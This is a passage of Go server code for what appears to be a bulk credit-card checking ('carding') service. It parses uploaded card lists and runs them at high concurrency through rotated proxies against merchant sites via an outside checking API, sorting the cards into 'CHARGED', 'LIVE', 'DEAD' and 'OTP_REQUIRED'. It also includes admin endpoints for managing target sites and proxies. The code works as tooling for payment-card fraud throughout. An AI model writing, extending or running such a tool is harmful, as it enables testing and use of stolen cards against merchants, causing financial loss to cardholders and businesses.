	if err := json.NewDecoder(r.Body).Decode(&reqData); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	concurrency := 1000
	getConcurrency := func(val interface{}) int {
		if val == nil {
			return 0
		}
		switch v := val.(type) {
		case float64:
			return int(v)
		case string:
			if i, err := strconv.Atoi(v); err == nil {
				return i
			}
		}
		return 0
	}
	if c := getConcurrency(reqData.Concurrency); c > 0 {
		concurrency = c
	} else if s := getConcurrency(reqData.Semaphore); s > 0 {
		concurrency = s
	}

	userID, _, isAdmin := getSessionUser(r)
	sites := getSites(userID, isAdmin)
	proxies := reqData.Proxies
	if len(proxies) == 0 {
		proxies = getProxies(userID, isAdmin)
	}
	client := &http.Client{
		Timeout: 90 * time.Second,
	}
	sacAPI := os.Getenv("SAC_API")
	if sacAPI == "" {
		sacAPI = "https://sac-1-qg37.onrender.com"
	}

	results := checkCardsBatch(client, sacAPI, reqData.Cards, sites, proxies, concurrency)

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{"results": results})
}

func handleCheckSSE(w http.ResponseWriter, r *http.Request, cards []Card, sites []string, proxies []string, concurrency int) {
	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	w.Header().Set("Connection", "keep-alive")
	w.Header().Set("X-Accel-Buffering", "no")

	flusher, ok := w.(http.Flusher)
	if !ok {
		http.Error(w, "Streaming unsupported", http.StatusInternalServerError)
		return
	}

	client := &http.Client{
		Timeout: 90 * time.Second,
	}
	sacAPI := os.Getenv("SAC_API")
	if sacAPI == "" {
		sacAPI = "https://sac-1-qg37.onrender.com"
	}

	var allResults []CheckResult
	batchSize := 200
	totalCards := len(cards)

	for i := 0; i < totalCards; i += batchSize {
		end := i + batchSize
		if end > totalCards {
			end = totalCards
		}
		batch := cards[i:end]
		batchResults := checkCardsBatch(client, sacAPI, batch, sites, proxies, concurrency)
		allResults = append(allResults, batchResults...)

		stats := map[string]int{
			"total":       len(allResults),
			"done":        len(allResults),
			"charged":     0,
			"live":        0,
			"fraud":       0,
			"dead":        0,
			"error":       0,
			"low_balance": 0,
			"otp":         0,
		}
		for _, res := range allResults {
			switch res.Status {
			case "CHARGED":
				stats["charged"]++
			case "LIVE":
				stats["live"]++
			case "FRAUD":
				stats["fraud"]++
			case "DEAD":
				stats["dead"]++
			case "LOW_BALANCE":
				stats["low_balance"]++
			case "OTP_REQUIRED":
				stats["otp"]++
			case "ERROR", "TIMEOUT", "EXCEPTION":
				stats["error"]++
			}
		}

		eventData, _ := json.Marshal(map[string]interface{}{
			"type":        "batch",
			"results":     batchResults,
			"stats":       stats,
			"total_cards": totalCards,
		})
		fmt.Fprintf(w, "data: %s\n\n", string(eventData))
		flusher.Flush()
	}

	stats := map[string]int{
		"total":       len(allResults),
		"done":        len(allResults),
		"charged":     0,
		"live":        0,
		"fraud":       0,
		"dead":        0,
		"error":       0,
		"low_balance": 0,
		"otp":         0,
	}
	for _, res := range allResults {
		switch res.Status {
		case "CHARGED":
			stats["charged"]++
		case "LIVE":
			stats["live"]++
		case "FRAUD":
			stats["fraud"]++
		case "DEAD":
			stats["dead"]++
		case "LOW_BALANCE":
			stats["low_balance"]++
		case "OTP_REQUIRED":
			stats["otp"]++
		case "ERROR", "TIMEOUT", "EXCEPTION":
			stats["error"]++
		}
	}

	eventData, _ := json.Marshal(map[string]interface{}{
		"type":        "done",
		"stats":       stats,
		"total_cards": totalCards,
	})
	fmt.Fprintf(w, "data: %s\n\n", string(eventData))
	flusher.Flush()
}

func apiCheckHandler(w http.ResponseWriter, r *http.Request) {
	var reqData struct {
		Cards       string      `json:"cards"`
		Proxies     []string    `json:"proxies"`
		Concurrency interface{} `json:"concurrency"`
		Semaphore   interface{} `json:"semaphore"`
	}
	if err := json.NewDecoder(r.Body).Decode(&reqData); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	cards := parseCards(reqData.Cards)
	if len(cards) == 0 {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{"error": "No valid cards found"})
		return
	}

	concurrency := 1000
	getConcurrency := func(val interface{}) int {
		if val == nil {
			return 0
		}
		switch v := val.(type) {
		case float64:
			return int(v)
		case string:
			if i, err := strconv.Atoi(v); err == nil {
				return i
			}
		}
		return 0
	}
	if c := getConcurrency(reqData.Concurrency); c > 0 {
		concurrency = c
	} else if s := getConcurrency(reqData.Semaphore); s > 0 {
		concurrency = s
	}

	userID, _, isAdmin := getSessionUser(r)
	sites := getSites(userID, isAdmin)
	proxies := reqData.Proxies
	if len(proxies) == 0 {
		proxies = getProxies(userID, isAdmin)
	}
	handleCheckSSE(w, r, cards, sites, proxies, concurrency)
}

func apiCheckUploadHandler(w http.ResponseWriter, r *http.Request) {
	r.ParseMultipartForm(200 << 20)
	file, _, err := r.FormFile("file")
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{"error": "No file uploaded"})
		return
	}
	defer file.Close()

	contentBytes, err := io.ReadAll(file)
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{"error": err.Error()})
		return
	}

	cards := parseCards(string(contentBytes))
	if len(cards) == 0 {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{"error": "No valid cards found in file"})
		return
	}

	proxiesRaw := r.FormValue("proxies")
	var proxies []string
	if proxiesRaw != "" {
		if err := json.Unmarshal([]byte(proxiesRaw), &proxies); err != nil {
			lines := strings.Split(proxiesRaw, "\n")
			for _, line := range lines {
				line = strings.TrimSpace(line)
				if line != "" {
					proxies = append(proxies, line)
				}
			}
		}
	}

	concurrencyVal := r.FormValue("concurrency")
	if concurrencyVal == "" {
		concurrencyVal = r.FormValue("semaphore")
	}
	concurrency := 1000
	if concurrencyVal != "" {
		if i, err := strconv.Atoi(concurrencyVal); err == nil {
			concurrency = i
		}
	}

	userID, _, isAdmin := getSessionUser(r)
	sites := getSites(userID, isAdmin)
	if len(proxies) == 0 {
		proxies = getProxies(userID, isAdmin)
	}
	handleCheckSSE(w, r, cards, sites, proxies, concurrency)
}

func apiUploadSitesHandler(w http.ResponseWriter, r *http.Request) {
	r.ParseMultipartForm(200 << 20)
	file, _, err := r.FormFile("file")
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{"error": "No file uploaded"})
		return
	}
	defer file.Close()

	contentBytes, _ := io.ReadAll(file)
	lines := strings.Split(string(contentBytes), "\n")
	var sites []string
	seen := make(map[string]bool)
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" && !seen[line] {
			seen[line] = true
			sites = append(sites, line)
		}
	}
	saveFile(SITES_FILE, sites)
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{"loaded": len(sites)})
}

func apiUploadProxiesHandler(w http.ResponseWriter, r *http.Request) {
	r.ParseMultipartForm(200 << 20)
	file, _, err := r.FormFile("file")
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{"error": "No file uploaded"})
		return
	}
	defer file.Close()

	contentBytes, _ := io.ReadAll(file)
	lines := strings.Split(string(contentBytes), "\n")
	var proxies []string
	seen := make(map[string]bool)
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" && !seen[line] {
			seen[line] = true
			proxies = append(proxies, line)
		}
	}
	saveFile(PROXIES_FILE, proxies)
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{"loaded": len(proxies)})
}

func apiClearSitesHandler(w http.ResponseWriter, r *http.Request) {
	saveFile(SITES_FILE, []string{})
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{"cleared": true})
}

func apiClearProxiesHandler(w http.ResponseWriter, r *http.Request) {
	saveFile(PROXIES_FILE, []string{})
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{"cleared": true})
}

func apiAdminDBInfoHandler(w http.ResponseWriter, r *http.Request) {
	userID, _, isAdmin := getSessionUser(r)
	sites := getSites(userID, isAdmin)
	proxies := getProxies(userID, isAdmin)

	dbStatus := "Disconnected"
	maskedURL := "None"

	dbURL := os.Getenv("DATABASE_URL")
	if dbURL != "" {
		dbStatus = "Connected"
		parts := strings.Split(dbURL, "@")
		if len(parts) > 1 {
			hostPart := strings.Split(parts[1], "?")[0]
			maskedURL = "postgresql://***:***@" + hostPart
		} else {
			maskedURL = "postgresql://***"
		}

		if db != nil {
			if err := db.Ping(); err == nil {
				dbStatus = "Connected (Active)"
			} else {
				dbStatus = "Connected (Connection Error)"
			}
		} else {
			dbStatus = "Connected (Connection Error)"
		}
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"db_status": dbStatus,
		"db_url":    maskedURL,
		"sites":     sites,
		"proxies":   proxies,
	})
}

func dbAddSite(url string) {
	if db == nil {
		return
	}
	_, _ = db.Exec("INSERT INTO sites (url) VALUES ($1) ON CONFLICT (url) DO NOTHING", url)
}

func dbDeleteSite(url string) {
	if db == nil {
		return
	}
	_, _ = db.Exec("DELETE FROM sites WHERE url = $1", url)
}

func dbAddProxy(proxy string) {
	if db == nil {
		return
	}
	_, _ = db.Exec("INSERT INTO proxies (proxy) VALUES ($1) ON CONFLICT (proxy) DO NOTHING", proxy)
}

func dbDeleteProxy(proxy string) {
	if db == nil {
		return
	}
	_, _ = db.Exec("DELETE FROM proxies WHERE proxy = $1", proxy)
}

func apiAdminAddSiteHandler(w http.ResponseWriter, r *http.Request) {
	var reqData struct {
		URL string `json:"url"`
	}
	if err := json.NewDecoder(r.Body).Decode(&reqData); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	urlStr := strings.TrimSpace(reqData.URL)
	if urlStr == "" {
		http.Error(w, "URL is empty", http.StatusBadRequest)
		return
	}

	fileSites := loadFile(SITES_FILE)
	found := false
	for _, s := range fileSites {
		if s == urlStr {
			found = true
			break
		}
	}
	if !found {
		fileSites = append(fileSites, urlStr)
		saveFile(SITES_FILE, fileSites)
	}

	dbAddSite(urlStr)

	dbCacheMu.Lock()
	dbSitesCache = nil
	dbCacheMu.Unlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{"success": true})
}

func apiAdminDeleteSiteHandler(w http.ResponseWriter, r *http.Request) {
	var reqData struct {
		URL string `json:"url"`
	}
	if err := json.NewDecoder(r.Body).Decode(&reqData); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	urlStr := strings.TrimSpace(reqData.URL)
	if urlStr == "" {
		http.Error(w, "URL is empty", http.StatusBadRequest)
		return
	}

	fileSites := loadFile(SITES_FILE)
	var newSites []string
	for _, s := range fileSites {
		if s != urlStr {
			newSites = append(newSites, s)
		}
	}
	saveFile(SITES_FILE, newSites)

	dbDeleteSite(urlStr)

	dbCacheMu.Lock()
	dbSitesCache = nil
	dbCacheMu.Unlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{"success": true})
}

func apiAdminAddProxyHandler(w http.ResponseWriter, r *http.Request) {
	var reqData struct {
		Proxy string `json:"proxy"`
	}
	if err := json.NewDecoder(r.Body).Decode(&reqData); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	proxy := strings.TrimSpace(reqData.Proxy)
	if proxy == "" {
		http.Error(w, "Proxy is empty", http.StatusBadRequest)
		return
	}

	fileProxies := loadFile(PROXIES_FILE)
	found := false
	for _, p := range fileProxies {
		if p == proxy {
			found = true
			break
		}
	}
	if !found {
		fileProxies = append(fileProxies, proxy)
		saveFile(PROXIES_FILE, fileProxies)
	}

	dbAddProxy(proxy)

	dbCacheMu.Lock()
	dbProxiesCache = nil
	dbCacheMu.Unlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{"success": true})
}

func apiAdminDeleteProxyHandler(w http.ResponseWriter, r *http.Request) {
	var reqData struct {
		Proxy string `json:"proxy"`
	}
	if err := json.NewDecoder(r.Body).Decode(&reqData); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	proxy := strings.TrimSpace(reqData.Proxy)
	if proxy == "" {
		http.Error(w, "Proxy is empty", http.StatusBadRequest)
		return
	}

	fileProxies := loadFile(PROXIES_FILE)
	var newProxies []string
	for _, p := range fileProxies {
		if p != proxy {
			newProxies = append(newProxies, p)
		}
	}
	saveFile(PROXIES_FILE, newProxies)

	dbDeleteProxy(proxy)

	dbCacheMu.Lock()
	dbProxiesCache = nil
	dbCacheMu.Unlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{"success": true})
}

func dbClearSites() {
	if db == nil {
		return
	}
	_, _ = db.Exec("TRUNCATE TABLE sites")
}

func dbClearProxies() {
	if db == nil {
		return
	}
	_, _ = db.Exec("TRUNCATE TABLE proxies")
}

func apiAdminUploadSitesHandler(w http.ResponseWriter, r *http.Request) {
	r.ParseMultipartForm(200 << 20)
	file, _, err := r.FormFile("file")
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{"error": "No file uploaded"})
		return
	}
	defer file.Close()

	contentBytes, err := io.ReadAll(file)
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{"error": err.Error()})
		return
	}

	content := string(contentBytes)
	lines := strings.Split(content, "\n")
	fileSites := loadFile(SITES_FILE)
	loadedCount := 0

	for _, line := range lines {
		urlStr := strings.TrimSpace(line)
		if urlStr != "" {
			found := false
			for _, s := range fileSites {
				if s == urlStr {
					found = true
					break
				}
			}
			if !found {
				fileSites = append(fileSites, urlStr)
			}
			dbAddSite(urlStr)
			loadedCount++
		}
	}

	saveFile(SITES_FILE, fileSites)

	dbCacheMu.Lock()
	dbSitesCache = nil
	dbCacheMu.Unlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{"success": true, "loaded": loadedCount})
}

func apiAdminClearSitesHandler(w http.ResponseWriter, r *http.Request) {
	saveFile(SITES_FILE, []string{})
	dbClearSites()

	dbCacheMu.Lock()
	dbSitesCache = nil
	dbCacheMu.Unlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{"success": true})
}

func apiAdminUploadProxiesHandler(w http.ResponseWriter, r *http.Request) {
	r.ParseMultipartForm(200 << 20)
	file, _, err := r.FormFile("file")
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{"error": "No file uploaded"})
		return
	}
	defer file.Close()

	contentBytes, err := io.ReadAll(file)
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{"error": err.Error()})
		return
	}

	content := string(contentBytes)
	lines := strings.Split(content, "\n")
	fileProxies := loadFile(PROXIES_FILE)
	loadedCount := 0

	for _, line := range lines {
		proxy := strings.TrimSpace(line)
		if proxy != "" {
			found := false
			for _, p := range fileProxies {
				if p == proxy {
					found = true
					break
				}
			}
			if !found {
				fileProxies = append(fileProxies, proxy)
			}
			dbAddProxy(proxy)
			loadedCount++
		}
	}

	saveFile(PROXIES_FILE, fileProxies)

	dbCacheMu.Lock()
	dbProxiesCache = nil
	dbCacheMu.Unlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{"success": true, "loaded": loadedCount})
}

func apiAdminClearProxiesHandler(w http.ResponseWriter, r *http.Request) {
	saveFile(PROXIES_FILE, []string{})
	dbClearProxies()

	dbCacheMu.Lock()
	dbProxiesCache = nil
	dbCacheMu.Unlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{"success": true})
}

func main() {
	loadDotEnv()
	initDB()

	os.MkdirAll(DATA_DIR, 0755)

	mux := http.NewServeMux()


	// Serve React compiled static assets
	assetsFS := http.FileServer(http.Dir("frontend/dist"))
	mux.Handle("/assets/", assetsFS)
	mux.HandleFunc("/favicon.svg", func(w http.ResponseWriter, r *http.Request) {
		http.ServeFile(w, r, "frontend/dist/favicon.svg")
	})

	mux.HandleFunc("/", requireLogin(indexHandler))
	mux.HandleFunc("/login", requireLogin(loginHandler))
	mux.HandleFunc("/vanlinh", requireLogin(vanlinhHandler))

	mux.HandleFunc("/api/login/admin", apiLoginAdminHandler)
	mux.HandleFunc("/api/login/telegram", apiLoginTelegramHandler)
	mux.HandleFunc("/api/login/mock", apiLoginMockHandler)
	mux.HandleFunc("/api/login/token", apiLoginTokenHandler)
	mux.HandleFunc("/logout", logoutHandler)

	mux.HandleFunc("/api/stats", apiStatsHandler)
	mux.HandleFunc("/api/check_batch", requireLogin(apiCheckBatchHandler))
	mux.HandleFunc("/api/check", requireLogin(apiCheckHandler))
	mux.HandleFunc("/api/check/upload", requireLogin(apiCheckUploadHandler))

	mux.HandleFunc("/api/sites/upload", requireLogin(apiUploadSitesHandler))
	mux.HandleFunc("/api/proxies/upload", requireLogin(apiUploadProxiesHandler))
	mux.HandleFunc("/api/sites/clear", requireLogin(apiClearSitesHandler))
	mux.HandleFunc("/api/proxies/clear", requireLogin(apiClearProxiesHandler))

	mux.HandleFunc("/api/admin/db_info", requireLogin(requireAdmin(apiAdminDBInfoHandler)))
	mux.HandleFunc("/api/admin/site/add", requireLogin(requireAdmin(apiAdminAddSiteHandler)))
	mux.HandleFunc("/api/admin/site/delete", requireLogin(requireAdmin(apiAdminDeleteSiteHandler)))
	mux.HandleFunc("/api/admin/proxy/add", requireLogin(requireAdmin(apiAdminAddProxyHandler)))
	mux.HandleFunc("/api/admin/proxy/delete", requireLogin(requireAdmin(apiAdminDeleteProxyHandler)))
	mux.HandleFunc("/api/admin/site/upload", requireLogin(requireAdmin(apiAdminUploadSitesHandler)))
	mux.HandleFunc("/api/admin/site/clear", requireLogin(requireAdmin(apiAdminClearSitesHandler)))
	mux.HandleFunc("/api/admin/proxy/upload", requireLogin(requireAdmin(apiAdminUploadProxiesHandler)))
	mux.HandleFunc("/api/admin/proxy/clear", requireLogin(requireAdmin(apiAdminClearProxiesHandler)))

	port := os.Getenv("PORT")
	if port == "" {
		port = "8000"
	}

	log.Printf("Server starting on http://0.0.0.0:%s", port)
	if err := http.ListenAndServe("0.0.0.0:"+port, mux); err != nil {
		log.Fatal(err)
	}
}
